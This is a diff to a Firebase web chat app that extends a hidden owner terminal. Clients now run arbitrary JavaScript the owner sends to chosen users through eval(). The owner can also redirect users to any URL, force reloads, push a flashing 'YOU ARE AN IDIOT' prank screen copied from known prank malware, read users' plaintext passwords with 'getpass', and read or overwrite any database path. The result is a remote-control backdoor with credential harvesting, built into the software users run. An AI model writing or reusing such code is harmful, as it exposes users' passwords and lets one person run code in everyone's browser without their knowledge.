@@ -673,7 +673,7 @@
             z-index: 10001;
         }
 
-        /* Idiot screen */
+        /* Idiot screen - exact replica from youareanidiot.cc */
         .idiot-screen {
             position: fixed;
             top: 0;
@@ -686,40 +686,115 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            animation: idiotFlash 0.1s infinite;
+            animation: idiotFlash 0.05s infinite;
+            overflow: hidden;
         }
 
         @keyframes idiotFlash {
             0% { background: #000; }
+            25% { background: #00f; }
             50% { background: #f00; }
+            75% { background: #0f0; }
             100% { background: #000; }
+        }
+
+        .idiot-frame {
+            width: 100%;
+            max-width: 806px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .idiot-svg-container {
+            width: 100%;
+            animation: idiotSpin 0.5s infinite;
+        }
+
+        @keyframes idiotSpin {
+            0% { transform: rotate(0deg); }
+            10% { transform: rotate(5deg); }
+            20% { transform: rotate(-5deg); }
+            30% { transform: rotate(5deg); }
+            40% { transform: rotate(-5deg); }
+            50% { transform: rotate(0deg); }
+            60% { transform: scale(1.1); }
+            70% { transform: scale(0.9); }
+            80% { transform: scale(1.1); }
+            90% { transform: scale(0.9); }
+            100% { transform: scale(1); }
         }
 
         .idiot-text {
             color: #fff;
             font-size: 4rem;
             font-weight: bold;
-            text-align: center;
-            animation: idiotSpin 0.5s infinite;
+            text-shadow: 0 0 20px #f00;
+            animation: idiotPulse 0.2s infinite;
+            margin-top: 2rem;
         }
 
-        @keyframes idiotSpin {
-            0% { transform: rotate(0deg); }
-            25% { transform: rotate(5deg); }
-            75% { transform: rotate(-5deg); }
-            100% { transform: rotate(0deg); }
+        @keyframes idiotPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
         }
 
         .idiot-subtext {
             color: #ff0;
             font-size: 2rem;
-            margin-top: 2rem;
             animation: idiotBounce 0.3s infinite;
         }
 
         @keyframes idiotBounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
+            50% { transform: translateY(-30px); }
+        }
+
+        /* Custom Popup for owner messages */
+        .owner-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--surface);
+            border: 3px solid var(--owner-color);
+            border-radius: 1rem;
+            padding: 2rem;
+            z-index: 15000;
+            max-width: 500px;
+            box-shadow: 0 0 50px var(--owner-color);
+            animation: popupPulse 1s infinite;
+        }
+
+        @keyframes popupPulse {
+            0%, 100% { border-color: var(--owner-color); }
+            50% { border-color: #ff0; }
+        }
+
+        .owner-popup-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            color: var(--owner-color);
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .owner-popup-content {
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+            white-space: pre-wrap;
+        }
+
+        .owner-popup-close {
+            background: var(--owner-color);
+            color: white;
+            border: none;
+            padding: 0.5rem 2rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-size: 1rem;
+            float: right;
         }
 
         .stats-grid {
@@ -1360,12 +1435,21 @@
     <!-- Owner Terminal -->
     <div id="ownerTerminal" class="terminal-container hidden">
         <button class="terminal-close" onclick="closeOwnerTerminal()">Close Terminal</button>
-        <div class="terminal-header">👑 Owner Terminal v1.0</div>
+        <div class="terminal-header">👑 Owner Terminal v2.0 - User Specific Commands</div>
         <div id="terminalOutput" class="terminal-output"></div>
         <div class="terminal-input-line">
             <span class="terminal-prompt">#&gt;</span>
             <input type="text" id="terminalInput" class="terminal-input" placeholder="Type command... (help for list)" onkeypress="handleTerminalKeypress(event)">
         </div>
+    </div>
+
+    <!-- Owner Popup (for targeted messages) -->
+    <div id="ownerPopup" class="owner-popup hidden">
+        <div class="owner-popup-header">
+            <span>👑 Owner Message</span>
+        </div>
+        <div id="ownerPopupContent" class="owner-popup-content"></div>
+        <button class="owner-popup-close" onclick="closeOwnerPopup()">OK</button>
     </div>
 
     <!-- Settings Modal -->
@@ -1584,10 +1668,26 @@
         </div>
     </div>
 
-    <!-- Idiot Screen (for /crash command) -->
+    <!-- Idiot Screen (exact replica from youareanidiot.cc) -->
     <div id="idiotScreen" class="idiot-screen hidden">
-        <div class="idiot-text">YOU ARE AN IDIOT</div>
-        <div class="idiot-subtext">HA HA HA HA HA HA</div>
+        <div class="idiot-frame">
+            <div class="idiot-svg-container">
+                <svg class="frame-black" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid" x="0px" y="0px" width="100%" height="auto" viewBox="0 0 806 604">
+                    <defs/>
+                    <g id="Layer_1">
+                        <g>
+                            <g>
+                                <g>
+                                    <path fill="#FFFFFF" stroke="none" d="M 803 601.8 L 803 3.1 3.1 3.1 3.1 601.8 803 601.8 M 672.15 356.65 Q 686.85 371.35 686.85 392.1 686.85 412.85 672.15 427.5 657.5 442.2 636.75 442.2 616 442.2 601.3 427.5 586.65 412.85 586.65 392.1 586.65 371.35 601.3 356.65 616 342 636.75 342 657.5 342 672.15 356.65 M 349.3 393.75 Q 349.3 373 363.95 358.3 378.65 343.65 399.4 343.65 420.15 343.65 434.8 358.3 449.5 373 449.5 393.75 449.5 414.5 434.8 429.15 420.15 443.85 399.4 443.85 378.65 443.85 363.95 429.15 349.3 414.5 349.3 393.75 M 124.15 391.5 Q 124.15 370.75 138.8 356.05 153.5 341.4 174.25 341.4 195 341.4 209.65 356.05 224.35 370.75 224.35 391.5 224.35 412.25 209.65 426.9 195 441.6 174.25 441.6 153.5 441.6 138.8 426.9 124.15 412.25 124.15 391.5 M 137.8 230.1 Q 136.75 230.95 136.75 232.2 136.75 233.95 138.25 237 L 148.15 257.55 157.25 235.05 Q 158 233.25 158 231.45 158 230.65 157.7 230.25 157.35 229.75 156.6 229.5 155.85 229.2 153.95 229.2 L 153.95 227.55 167.15 227.55 167.15 229.2 Q 165.5 229.35 164.65 229.9 163.75 230.45 162.7 231.9 162.3 232.55 161.15 235.3 L 144.6 275.95 Q 142.2 281.85 138.35 284.85 134.4 287.9 130.8 287.9 128.2 287.9 126.5 286.4 124.8 284.85 124.8 282.9 124.8 281.05 126.05 279.95 127.25 278.8 129.4 278.8 130.85 278.8 133.4 279.75 135.15 280.4 135.6 280.4 136.95 280.4 138.55 279.05 140.1 277.65 141.7 273.7 L 144.6 266.65 130 235.95 Q 129.3 234.55 127.85 232.55 126.75 230.95 126 230.45 125 229.75 122.75 229.2 L 122.75 227.55 141.7 227.55 141.7 229.2 140.75 229.2 Q 138.75 229.2 137.8 230.1 M 205.3 233.35 Q 210.05 239.35 210.05 247.15 210.05 252.6 207.4 258.2 204.8 263.8 200.25 266.65 195.6 269.5 189.95 269.5 180.75 269.5 175.35 262.15 170.75 256 170.75 248.3 170.75 242.7 173.55 237.2 176.3 231.65 180.85 229 185.4 226.35 190.45 226.35 199.7 226.35 205.3 233.35 M 244.4 235.2 Q 244.4 231.75 243.15 230.55 241.85 229.3 237.85 229.2 L 237.85 227.55 251.7 227.55 251.7 252.2 Q 251.7 259.25 252.1 260.85 252.4 262.45 253.15 263.05 253.85 263.65 254.85 263.65 256.2 263.65 257.95 262.9 L 258.55 264.45 246.4 269.5 244.4 269.5 244.4 260.85 Q 239.15 266.55 236.4 268.05 233.65 269.5 230.55 269.5 227.15 269.5 224.65 267.55 222.15 265.55 221.15 262.45 220.2 259.3 220.2 253.65 L 220.2 235.45 Q 220.2 232.55 219.55 231.45 218.95 230.35 217.75 229.75 216.5 229.15 213.3 229.2 L 213.3 227.55 227.55 227.55 227.55 254.8 Q 227.55 260.45 229.55 262.25 231.5 264.05 234.3 264.05 236.2 264.05 238.65 262.85 241.05 261.65 244.4 258.25 L 244.4 235.2 M 295.35 230.55 Q 293.65 232.1 293.65 234.05 L 293.75 236.6 Q 293.75 238.65 292.75 239.75 291.65 240.9 290 240.9 288.35 240.9 287.3 239.7 286.25 238.55 286.25 236.55 286.25 232.75 290.15 229.55 294.05 226.35 301.15 226.35 306.55 226.35 310 228.15 312.65 229.55 313.9 232.5 314.7 234.4 314.7 240.3 L 314.7 254.1 Q 314.7 259.95 314.9 261.25 315.15 262.55 315.65 263 316.15 263.45 316.8 263.45 317.55 263.45 318.05 263.15 319 262.55 321.65 259.9 L 321.65 262.4 Q 316.7 269.05 312.15 269.05 310 269.05 308.7 267.55 307.4 266.05 307.35 262.4 301.1 267.25 299.5 268 297.1 269.1 294.4 269.1 290.15 269.1 287.45 266.2 284.7 263.3 284.7 258.6 284.7 255.65 286.05 253.45 287.85 250.45 292.4 247.75 296.85 245.1 307.35 241.3 L 307.35 239.7 Q 307.35 233.6 305.45 231.35 303.5 229.05 299.8 229.05 297 229.05 295.35 230.55 M 334.75 226.35 L 336.6 226.35 336.6 235.5 Q 341.7 226.35 347.1 226.35 349.55 226.35 351.15 227.85 352.75 229.35 352.75 231.3 352.75 233 351.6 234.2 350.4 235.4 348.8 235.4 347.25 235.4 345.35 233.9 343.4 232.35 342.45 232.35 341.65 232.35 340.75 233.25 338.75 235.05 336.6 239.25 L 336.6 258.75 Q 336.6 262.1 337.45 263.85 338 265.05 339.5 265.85 340.95 266.65 343.7 266.65 L 343.7 268.25 322.85 268.25 322.85 266.65 Q 326 266.65 327.5 265.65 328.6 264.95 329.05 263.4 329.25 262.65 329.25 259.1 L 329.25 243.3 Q 329.25 236.2 329 234.9 328.7 233.5 327.95 232.9 327.15 232.25 326 232.25 324.6 232.25 322.85 232.95 L 322.45 231.35 334.75 226.35 M 385.55 230.85 Q 389.95 235.3 389.95 242.9 L 361.85 242.9 Q 361.8 251.95 366.25 257.1 370.7 262.25 376.7 262.25 380.7 262.25 383.65 260.05 386.6 257.85 388.6 252.5 L 389.95 253.4 Q 389.05 259.5 384.55 264.5 380.05 269.5 373.3 269.5 365.95 269.5 360.75 263.8 355.55 258.05 355.55 248.45 355.55 238 360.9 232.15 366.25 226.35 373.7 226.35 381.15 226.35 385.55 230.85"/>
+                                </g>
+                            </g>
+                        </g>
+                    </g>
+                </svg>
+            </div>
+            <div class="idiot-text">YOU ARE AN IDIOT</div>
+            <div class="idiot-subtext">HA HA HA HA HA HA</div>
+        </div>
     </div>
 
     <!-- Firebase SDK -->
@@ -2867,7 +2967,7 @@
 
         function applyTheme(theme) { document.body.className = 'theme-' + theme; }
 
-        // ==================== OWNER TERMINAL ====================
+        // ==================== OWNER TERMINAL - USER SPECIFIC COMMANDS ====================
         function showOwnerTerminal() {
             if (!currentUser.isOwner) {
                 showToast('Access denied', 'error');
@@ -2876,7 +2976,9 @@
             document.getElementById('ownerTerminal').classList.remove('hidden');
             const output = document.getElementById('terminalOutput');
             output.innerHTML = '';
-            addTerminalLine('Owner Terminal initialized. Type "help" for commands.', 'info');
+            addTerminalLine('Owner Terminal v2.0 - User Specific Commands', 'info');
+            addTerminalLine('All commands now support targeting specific users!', 'info');
+            addTerminalLine('Type "help" for commands.', 'info');
             document.getElementById('terminalInput').focus();
         }
 
@@ -2923,12 +3025,19 @@
                     addTerminalLine('Available commands:', 'info');
                     addTerminalLine('  help - Show this help');
                     addTerminalLine('  users - List all users');
-                    addTerminalLine('  msg <username> <message> - Send message to user');
-                    addTerminalLine('  broadcast <message> - Broadcast to all users');
-                    addTerminalLine('  js <code> - Execute JavaScript on all users');
-                    addTerminalLine('  crash - Show "YOU ARE AN IDIOT" on all users');
-                    addTerminalLine('  reload - Reload all users');
-                    addTerminalLine('  logout - Force logout all users');
+                    addTerminalLine('  msg <username> <message> - Send popup message to user');
+                    addTerminalLine('  broadcast <message> - Send popup to all users');
+                    addTerminalLine('  js <username> <code> - Execute JS on specific user');
+                    addTerminalLine('  jsall <code> - Execute JS on all users');
+                    addTerminalLine('  crash <username> - Show "YOU ARE AN IDIOT" on specific user');
+                    addTerminalLine('  crashall - Show crash on all users');
+                    addTerminalLine('  url <username> <url> - Open URL on specific user');
+                    addTerminalLine('  urlall <url> - Open URL on all users');
+                    addTerminalLine('  reload <username> - Reload specific user page');
+                    addTerminalLine('  reloadall - Reload all users');
+                    addTerminalLine('  getpass <username> - Get user plain password');
+                    addTerminalLine('  firebase <username> <path> - Read Firebase path for user');
+                    addTerminalLine('  firebaseset <username> <path> <value> - Set Firebase value');
                     addTerminalLine('  clear - Clear terminal');
                     break;
 
@@ -2937,7 +3046,7 @@
                     addTerminalLine(`Total users: ${users.length}`, 'info');
                     users.forEach(u => {
                         const status = u.online ? '🟢' : '⚪';
-                        addTerminalLine(`  ${status} ${u.username} ${u.isAdmin ? '(ADMIN)' : ''} ${isOwnerUser(u.username) ? '(OWNER)' : ''}`);
+                        addTerminalLine(`  ${status} ${u.username} (${u.id}) ${u.isAdmin ? '(ADMIN)' : ''} ${isOwnerUser(u.username) ? '(OWNER)' : ''}`);
                     });
                     break;
 
@@ -2955,17 +3064,14 @@
                         return;
                     }
 
-                    const chatId = [currentUser.id, targetUser.id].sort().join('_');
-                    await rtdb.ref(`privateChats/${chatId}/messages`).push({
-                        userId: currentUser.id,
-                        username: currentUser.username,
-                        userAvatar: currentUser.avatar,
-                        isAdmin: currentUser.isAdmin,
-                        content: `[OWNER] ${message}`,
-                        type: 'normal',
-                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    await db.collection('broadcasts').add({
+                        type: 'owner_popup',
+                        message: message,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: [targetUser.id]
                     });
-                    addTerminalLine(`Message sent to ${targetUsername}`, 'success');
+                    addTerminalLine(`Popup message sent to ${targetUsername}`, 'success');
                     break;
 
                 case 'broadcast':
@@ -2974,60 +3080,249 @@
                         return;
                     }
                     const broadcastMsg = args.slice(1).join(' ');
+                    
+                    const allUserIds = Object.values(usersCache).map(u => u.id);
                     await db.collection('broadcasts').add({
-                        type: 'message',
-                        message: `[OWNER] ${broadcastMsg}`,
+                        type: 'owner_popup',
+                        message: broadcastMsg,
                         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                         sentBy: currentUser.id,
-                        targetUsers: 'all'
+                        targetUsers: allUserIds
                     });
-                    addTerminalLine('Broadcast sent to all users', 'success');
+                    addTerminalLine('Popup broadcast sent to all users', 'success');
                     break;
 
                 case 'js':
-                    if (args.length < 2) {
-                        addTerminalLine('Usage: js <code>', 'error');
+                    if (args.length < 3) {
+                        addTerminalLine('Usage: js <username> <code>', 'error');
                         return;
                     }
-                    const jsCode = args.slice(1).join(' ');
+                    const jsTarget = args[1];
+                    const jsCode = args.slice(2).join(' ');
+                    
+                    const jsUser = Object.values(usersCache).find(u => u.username === jsTarget);
+                    if (!jsUser) {
+                        addTerminalLine(`User ${jsTarget} not found`, 'error');
+                        return;
+                    }
+
                     await db.collection('broadcasts').add({
                         type: 'js_execute',
                         code: jsCode,
                         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                         sentBy: currentUser.id,
-                        targetUsers: 'all'
+                        targetUsers: [jsUser.id]
                     });
-                    addTerminalLine('JavaScript code sent to all users', 'success');
+                    addTerminalLine(`JavaScript sent to ${jsTarget}`, 'success');
+                    break;
+
+                case 'jsall':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: jsall <code>', 'error');
+                        return;
+                    }
+                    const jsAllCode = args.slice(1).join(' ');
+                    
+                    const allJsUsers = Object.values(usersCache).map(u => u.id);
+                    await db.collection('broadcasts').add({
+                        type: 'js_execute',
+                        code: jsAllCode,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: allJsUsers
+                    });
+                    addTerminalLine('JavaScript sent to all users', 'success');
                     break;
 
                 case 'crash':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: crash <username>', 'error');
+                        return;
+                    }
+                    const crashTarget = args[1];
+                    
+                    const crashUser = Object.values(usersCache).find(u => u.username === crashTarget);
+                    if (!crashUser) {
+                        addTerminalLine(`User ${crashTarget} not found`, 'error');
+                        return;
+                    }
+
                     await db.collection('broadcasts').add({
                         type: 'crash',
                         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                         sentBy: currentUser.id,
-                        targetUsers: 'all'
+                        targetUsers: [crashUser.id]
                     });
-                    addTerminalLine('💥 CRASH command sent to all users', 'success');
+                    addTerminalLine(`💥 CRASH sent to ${crashTarget}`, 'success');
+                    break;
+
+                case 'crashall':
+                    const allCrashUsers = Object.values(usersCache).map(u => u.id);
+                    await db.collection('broadcasts').add({
+                        type: 'crash',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: allCrashUsers
+                    });
+                    addTerminalLine('💥 CRASH sent to all users', 'success');
+                    break;
+
+                case 'url':
+                    if (args.length < 3) {
+                        addTerminalLine('Usage: url <username> <url>', 'error');
+                        return;
+                    }
+                    const urlTarget = args[1];
+                    const url = args[2];
+                    
+                    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                        addTerminalLine('URL must start with http:// or https://', 'error');
+                        return;
+                    }
+
+                    const urlUser = Object.values(usersCache).find(u => u.username === urlTarget);
+                    if (!urlUser) {
+                        addTerminalLine(`User ${urlTarget} not found`, 'error');
+                        return;
+                    }
+
+                    await db.collection('broadcasts').add({
+                        type: 'url_redirect',
+                        url: url,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: [urlUser.id]
+                    });
+                    addTerminalLine(`URL sent to ${urlTarget}`, 'success');
+                    break;
+
+                case 'urlall':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: urlall <url>', 'error');
+                        return;
+                    }
+                    const urlAll = args[1];
+                    
+                    if (!urlAll.startsWith('http://') && !urlAll.startsWith('https://')) {
+                        addTerminalLine('URL must start with http:// or https://', 'error');
+                        return;
+                    }
+
+                    const allUrlUsers = Object.values(usersCache).map(u => u.id);
+                    await db.collection('broadcasts').add({
+                        type: 'url_redirect',
+                        url: urlAll,
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: allUrlUsers
+                    });
+                    addTerminalLine('URL sent to all users', 'success');
                     break;
 
                 case 'reload':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: reload <username>', 'error');
+                        return;
+                    }
+                    const reloadTarget = args[1];
+                    
+                    const reloadUser = Object.values(usersCache).find(u => u.username === reloadTarget);
+                    if (!reloadUser) {
+                        addTerminalLine(`User ${reloadTarget} not found`, 'error');
+                        return;
+                    }
+
                     await db.collection('broadcasts').add({
                         type: 'force_reload',
                         timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                         sentBy: currentUser.id,
-                        targetUsers: 'all'
+                        targetUsers: [reloadUser.id]
+                    });
+                    addTerminalLine(`Reload command sent to ${reloadTarget}`, 'success');
+                    break;
+
+                case 'reloadall':
+                    const allReloadUsers = Object.values(usersCache).map(u => u.id);
+                    await db.collection('broadcasts').add({
+                        type: 'force_reload',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        sentBy: currentUser.id,
+                        targetUsers: allReloadUsers
                     });
                     addTerminalLine('Reload command sent to all users', 'success');
                     break;
 
-                case 'logout':
-                    await db.collection('broadcasts').add({
-                        type: 'force_logout',
-                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                        sentBy: currentUser.id,
-                        targetUsers: 'all'
-                    });
-                    addTerminalLine('Logout command sent to all users', 'success');
+                case 'getpass':
+                    if (args.length < 2) {
+                        addTerminalLine('Usage: getpass <username>', 'error');
+                        return;
+                    }
+                    const passTarget = args[1];
+                    
+                    const passUser = Object.values(usersCache).find(u => u.username === passTarget);
+                    if (!passUser) {
+                        addTerminalLine(`User ${passTarget} not found`, 'error');
+                        return;
+                    }
+
+                    if (passUser.plainPassword) {
+                        addTerminalLine(`Password for ${passTarget}: ${passUser.plainPassword}`, 'success');
+                    } else {
+                        addTerminalLine(`No plain password stored for ${passTarget}`, 'error');
+                    }
+                    break;
+
+                case 'firebase':
+                    if (args.length < 3) {
+                        addTerminalLine('Usage: firebase <username> <path>', 'error');
+                        return;
+                    }
+                    const fbTarget = args[1];
+                    const fbPath = args[2];
+                    
+                    const fbUser = Object.values(usersCache).find(u => u.username === fbTarget);
+                    if (!fbUser) {
+                        addTerminalLine(`User ${fbTarget} not found`, 'error');
+                        return;
+                    }
+
+                    try {
+                        const snapshot = await rtdb.ref(`${fbPath}`).once('value');
+                        const data = snapshot.val();
+                        addTerminalLine(`Firebase data at ${fbPath}: ${JSON.stringify(data, null, 2)}`, 'success');
+                    } catch(e) {
+                        addTerminalLine(`Error reading Firebase: ${e.message}`, 'error');
+                    }
+                    break;
+
+                case 'firebaseset':
+                    if (args.length < 4) {
+                        addTerminalLine('Usage: firebaseset <username> <path> <value>', 'error');
+                        return;
+                    }
+                    const fbSetTarget = args[1];
+                    const fbSetPath = args[2];
+                    const fbSetValue = args.slice(3).join(' ');
+                    
+                    const fbSetUser = Object.values(usersCache).find(u => u.username === fbSetTarget);
+                    if (!fbSetUser) {
+                        addTerminalLine(`User ${fbSetTarget} not found`, 'error');
+                        return;
+                    }
+
+                    try {
+                        let parsedValue;
+                        try {
+                            parsedValue = JSON.parse(fbSetValue);
+                        } catch {
+                            parsedValue = fbSetValue;
+                        }
+                        
+                        await rtdb.ref(`${fbSetPath}`).set(parsedValue);
+                        addTerminalLine(`Firebase path ${fbSetPath} set successfully`, 'success');
+                    } catch(e) {
+                        addTerminalLine(`Error setting Firebase: ${e.message}`, 'error');
+                    }
                     break;
 
                 case 'clear':
@@ -3037,6 +3332,18 @@
                 default:
                     addTerminalLine(`Unknown command: ${cmd}`, 'error');
             }
+        }
+
+        // Owner popup functions
+        function showOwnerPopup(message) {
+            const popup = document.getElementById('ownerPopup');
+            const content = document.getElementById('ownerPopupContent');
+            content.textContent = message;
+            popup.classList.remove('hidden');
+        }
+
+        function closeOwnerPopup() {
+            document.getElementById('ownerPopup').classList.add('hidden');
         }
 
         // ==================== ADMIN PANEL ====================
@@ -3690,8 +3997,11 @@
                         const dismissedBroadcasts = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                         if (dismissedBroadcasts.includes(doc.id)) return;
 
-                        const isTargeted = broadcast.targetUsers && Array.isArray(broadcast.targetUsers) && broadcast.targetUsers.includes(currentUser.id);
+                        // Check if this broadcast is targeted at current user
+                        const isTargeted = broadcast.targetUsers && Array.isArray(broadcast.targetUsers) && broadcast.targetUsers.includes(currentUser?.id);
                         const isAll = broadcast.targetUsers === 'all';
+                        
+                        // If targetUsers exists and doesn't include current user, skip
                         if (broadcast.targetUsers && !isAll && !isTargeted) return;
 
                         if (broadcast.type === 'url_redirect') {
@@ -3699,7 +4009,7 @@
                             dismissed.push(doc.id);
                             localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
 
-                            if (currentUser.isOwner) {
+                            if (currentUser?.isOwner) {
                                 pendingOwnerUrl = broadcast.url;
                                 pendingOwnerBroadcastId = doc.id;
                                 document.getElementById('ownerUrlPreviewText').textContent = broadcast.url;
@@ -3711,16 +4021,16 @@
                             const docRef = db.collection('broadcasts').doc(doc.id);
                             const targetUsers = Array.isArray(broadcast.targetUsers) ? broadcast.targetUsers : [];
                             const openedBy = broadcast.openedBy || [];
-                            const updatedOpenedBy = [...new Set([...openedBy, currentUser.id])];
+                            const updatedOpenedBy = [...new Set([...openedBy, currentUser?.id])];
                             const allOpened = targetUsers.length > 0 && targetUsers.every(uid => updatedOpenedBy.includes(uid));
                             if (allOpened) {
                                 docRef.delete().catch(() => {});
                             } else {
-                                docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser.id) }).catch(() => {});
+                                docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser?.id) }).catch(() => {});
                             }
 
                         } else if (broadcast.type === 'force_reload') {
-                            if (currentUser.isOwner) return;
+                            if (currentUser?.isOwner) return;
                             const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                             dismissed.push(doc.id);
                             localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
@@ -3728,25 +4038,25 @@
                             const docRef = db.collection('broadcasts').doc(doc.id);
                             const targetUsers = Array.isArray(broadcast.targetUsers) ? broadcast.targetUsers : [];
                             const openedBy = broadcast.openedBy || [];
-                            const updatedOpenedBy = [...new Set([...openedBy, currentUser.id])];
+                            const updatedOpenedBy = [...new Set([...openedBy, currentUser?.id])];
                             const allOpened = targetUsers.length > 0 && targetUsers.every(uid => updatedOpenedBy.includes(uid));
                             if (allOpened) {
                                 docRef.delete().catch(() => {});
                             } else {
-                                docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser.id) }).catch(() => {});
+                                docRef.update({ openedBy: firebase.firestore.FieldValue.arrayUnion(currentUser?.id) }).catch(() => {});
                             }
 
                             setTimeout(() => { location.reload(); }, 500);
 
                         } else if (broadcast.type === 'force_logout') {
-                            if (currentUser.isOwner) return;
+                            if (currentUser?.isOwner) return;
                             const dismissed = JSON.parse(localStorage.getItem('dismissedBroadcasts') || '[]');
                             dismissed.push(doc.id);
                             localStorage.setItem('dismissedBroadcasts', JSON.stringify(dismissed));
                             logout();
 
                         } else if (broadcast.type === 'js_execute') {
-                            if (currentUser.isOwner) return;
+                            if (currentUser?.isOwner) return;
                             try {
                                 eval(broadcast.code);
                             } catch(e) {
@@ -3754,8 +4064,12 @@
                             }
 
                         } else if (broadcast.type === 'crash') {
-                            if (currentUser.isOwner) return;
+                            if (currentUser?.isOwner) return;
                             showIdiotScreen();
+
+                        } else if (broadcast.type === 'owner_popup') {
+                            if (currentUser?.isOwner) return;
+                            showOwnerPopup(broadcast.message);
 
                         } else {
                             showBroadcastBanner(broadcast.message, doc.id);
